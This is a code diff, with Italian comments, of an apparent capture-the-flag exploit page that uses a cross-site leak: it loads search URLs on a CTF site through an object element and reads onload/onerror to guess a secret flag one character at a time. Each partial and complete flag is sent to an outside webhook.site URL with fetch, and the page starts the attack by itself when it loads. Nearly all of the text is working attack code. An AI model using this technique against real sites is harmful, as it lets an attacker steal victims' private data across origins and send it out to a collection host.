@@ -29,11 +29,11 @@
                 s.data = url;
                 s.onload = (e) => {
                     e.target.remove();
-                    return resolve(0); // Risorsa accessibile
+                    return resolve(0); // Risorsa accessibile (status 200)
                 };
                 s.onerror = (e) => {
                     e.target.remove();
-                    return resolve(1); // Risorsa non accessibile
+                    return resolve(1); // Risorsa non accessibile (status 404)
                 };
                 document.body.appendChild(s);
             });
@@ -42,12 +42,8 @@
         const logResult = async (message) => {
             const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad'; // URL del Webhook
             try {
-                // Costruisci l'URL con il messaggio come parametro
                 const urlWithParams = `${webhookUrl}?message=${encodeURIComponent(message)}`;
-                const response = await fetch(urlWithParams, {
-                    method: 'GET', // Cambiato a GET
-                });
-
+                const response = await fetch(urlWithParams, { method: 'GET' });
                 if (!response.ok) {
                     console.error('Errore durante l\'invio del log:', response.statusText);
                 } else {
@@ -58,34 +54,34 @@
             }
         };
 
-        const guessFlag = async (position) => {
-            // Se la lunghezza della flag è nota, puoi anche fermarti se hai raggiunto quella lunghezza
-            if (position >= currentFlag.length + 30) { // Sostituisci 10 con la lunghezza massima della flag prevista
-                console.log('Flag completa:', currentFlag);
-                return;
-            }
+        const guessFlag = async () => {
+            for (let i = 0; i < 30; i++) { // Limite massimo di lunghezza per evitare loop infiniti
+                let foundChar = false;
 
-            for (let char of validChars) {
-                const url = `https://matrix.capturetheflags.site/search?s=${currentFlag}${char}`; // URL da testare
-                const result = await leak(url); // Esegui il leak
+                for (let char of validChars) {
+                    const url = `https://matrix.capturetheflags.site/search?s=${currentFlag}${char}`;
+                    const result = await leak(url);
 
-                if (result === 0) { // Risorsa accessibile (status 200)
-                    currentFlag += char; // Aggiungi carattere corretto
-                    document.getElementById('result').textContent = `Flag parziale trovata: ${currentFlag}`;
-                    console.log(`Flag parziale trovata: ${currentFlag}`);
-                    
-                    // Invia il log della flag parziale al Webhook
-                    await logResult(`Flag parziale trovata: ${currentFlag}`);
-                    
-                    await guessFlag(position + 1); // Prova il prossimo carattere
-                    return; // Esci dopo aver trovato un carattere valido
+                    if (result === 0) { // Carattere trovato
+                        currentFlag += char;
+                        document.getElementById('result').textContent = `Flag parziale trovata: ${currentFlag}`;
+                        console.log(`Flag parziale trovata: ${currentFlag}`);
+                        await logResult(`Flag parziale trovata: ${currentFlag}`);
+                        foundChar = true;
+                        break; // Passa al carattere successivo
+                    }
+                }
+
+                if (!foundChar) { // Se nessun carattere è stato trovato, termina la ricerca
+                    console.log('Flag completa trovata:', currentFlag);
+                    await logResult(`Flag completa trovata: ${currentFlag}`);
+                    break;
                 }
             }
         };
 
-        // Esegui il test al caricamento del DOM
         document.addEventListener('DOMContentLoaded', () => {
-            guessFlag(0); // Inizia a indovinare la flag dalla posizione 0
+            guessFlag();
         });
     </script>
 </body>
